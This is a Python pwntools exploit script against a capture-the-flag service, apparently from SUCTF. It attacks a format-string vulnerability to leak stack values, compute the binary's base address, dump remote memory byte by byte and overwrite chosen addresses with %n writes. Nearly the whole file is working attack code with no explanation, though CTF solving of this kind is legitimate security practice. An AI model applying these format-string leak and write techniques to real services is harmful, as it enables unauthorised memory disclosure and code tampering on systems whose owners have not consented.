from pwn import *
sh = remote("pwn.suctf.asuri.org", 20001)

sh.recvuntil("password:")
sh.send("123456\n")
sh.recvuntil("cmd:")

def leak_stack():
	for i in xrange(0,32):
		sh.send("%" + str(i) + "$.16lx" + "\n")
		sh.recvuntil("cmd:")
		leak = sh.recvuntil("cmd:")
		leak = leak[:leak.find("\n")]
		print leak
#13->leak img base

def show():
	pass

def find_base():
	sh.send("%13$lx\n")
	sh.recvuntil("cmd:")
	leak = sh.recvuntil("cmd:")
	leak = leak[:leak.find("\n")]
	leak = int(leak, 16)
	assert (leak & 0xfff) == 0x1bd
	leak = leak - 0x1bd
	i = 0
	while True:
		string = read_string(leak - i)
		print string
		if string[:4] == "\x7fELF":
			print i
			break;
		i += 0x1000

def get_base():
	sh.send("%13$lx\n")
	sh.recvuntil("cmd:")
	leak = sh.recvuntil("cmd:")
	leak = leak[:leak.find("\n")]
	leak = int(leak, 16)
	assert (leak & 0xfff) == 0x1bd
	leak = leak - 0x1bd
	return leak - 0x1000

SIGN_STR = "201920192019"
def read_string(addr):
	payload = "%8$s" + SIGN_STR + p64(addr)
	sh.send(payload + "\n")
	sh.recvuntil("cmd:")
	ret = sh.recvuntil("cmd:")
	return ret[:ret.find(SIGN_STR)]


def tohex(string):
	return ''.join(x.encode('hex') for x in string)
def dump_section(addr_beg, size):
	ret = ""
	p = addr_beg
	while p < addr_beg + size:
		if (p & 0xff) == 0x0A:
			ret += "\x20\x19\x20\x19\x20\x19\x20\x19"
			p += 1
		else:
			output = read_string(p)
			length = len(output)
			ret += output
			ret += "\x00"
			p += length + 1
		print tohex(ret)
		#print ret
	return ret


def qword_zero(addr):
	payload = "%7$n%8$n"
	payload += p64(addr)
	payload += p64(addr)
	sh.send(payload + "\n")
	sh.recvuntil("cmd:")
	sh.recvuntil("cmd:")

base = get_base()
_start = base + 0x8A0
print hex(base)

#dump_section(_start, 0x2A)

main = _start + 36 + 0x0892
print "main: " + hex(main)
plt = base + 0x700
got = base + 0x2030c0
#dump_section(plt, 0x80)

resolve_got = base + 0x203010
vuln_func = base + 0xC2B
#dump_section(resolve_got, 8)
#dump_section(vuln_func, 0x800)
test_string = base + 0x20ef
printf_plt = base + 0x830
printf_got = printf_plt + 6 + 0x202802
#print "fake got " + hex(got)
#print "leaking " + hex(printf_got)
#dump_section(printf_got-0x20, 0x40)
#libc6_2.23-0ubuntu10_amd64.so

#dump_section(plt, 0x2000 - 0x700)
#dump all text
dump_section(base + 0x2030D0, 8)
qword_zero(base + 0x2030D0)
dump_section(base + 0x2030D0, 8)